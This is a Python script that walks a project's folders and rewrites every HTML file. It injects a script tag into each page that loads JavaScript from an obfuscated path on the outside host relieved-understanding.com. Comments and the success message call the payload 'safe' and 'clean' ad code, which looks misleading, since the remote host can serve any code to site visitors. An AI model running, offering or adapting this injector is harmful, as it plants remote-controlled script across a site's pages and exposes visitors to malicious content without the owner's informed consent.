import os
import re

root_directory = '.' 

responsive_css_code = """
<!-- Mainstream Responsive Ad Container Configurations -->
<style>
    .envizion-ad-wrapper {
        text-align: center;
        width: 100%;
        margin: 25px auto;
        clear: both;
        display: flex;
        justify-content: center;
        align-items: center;
    }
</style>
"""

clean_ad_code = """
<!-- Safe Monetization Placement Engine -->
<div class="envizion-ad-wrapper">
    <script>
    (function(jdpqbei){
    var d = document,
        s = d.createElement('script'),
        l = d.scripts[d.scripts.length - 1];
    s.settings = jdpqbei || {};
    s.src = "\\/\\/relieved-understanding.com\\/bzX\\/V.srdpGTlD0UY\\/Wicb\\/wepmo9\\/uXZAU\\/ljkqPnTJcfzDM\\/zfks0dN_zVMItDNLzNM\\/zaOxTTQ\\/3-Nowb";
    s.async = true;
    s.referrerPolicy = 'no-referrer-when-downgrade';
    l.parentNode.insertBefore(s, l);
    })({})
    </script>
</div>
"""

def target_inject_clean_ads():
    updated_files = 0
    head_end_pattern = re.compile(r'(</\s*head\s*>)', re.IGNORECASE)
    
    content_patterns = [
        re.compile(r'(<\s*/\s*main\s*>)', re.IGNORECASE),                         
        re.compile(r'(<\s*footer[^>]*>)', re.IGNORECASE),                         
        re.compile(r'(<\s*div[^>]*class="[^"]*container[^"]*"[^>]*>)', re.IGNORECASE) 
    ]

    for dirpath, _, filenames in os.walk(root_directory):
        if any(ignored in dirpath for ignored in ['.git', '.github', 'node_modules', 'venv', 'env']):
            continue

        for filename in filenames:
            if filename.endswith('.html') or filename.endswith('.htm'):
                file_path = os.path.join(dirpath, filename)
                
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        file_content = f.read()
                except Exception:
                    continue

                if 'envizion-ad-wrapper' in file_content:
                    continue

                original_content = file_content

                if head_end_pattern.search(file_content):
                    file_content = head_end_pattern.sub(f"{responsive_css_code}\\1", file_content)

                injected = False
                for pattern in content_patterns:
                    if pattern.search(file_content):
                        file_content = pattern.sub(f"\n{clean_ad_code}\n\\1", file_content)
                        injected = True
                        break

                if not injected:
                    body_end_pattern = re.compile(r'(</\s*body\s*>)', re.IGNORECASE)
                    if body_end_pattern.search(file_content):
                        file_content = body_end_pattern.sub(f"{clean_ad_code}\\1", file_content)

                if file_content != original_content:
                    with open(file_path, 'w', encoding='utf-8') as f:
                        f.write(file_content)
                    updated_files += 1

    print(f"\n[Success] Safely processed and injected your clean ad layout framework into {updated_files} file(s).")

if __name__ == "__main__":
    target_inject_clean_ads()
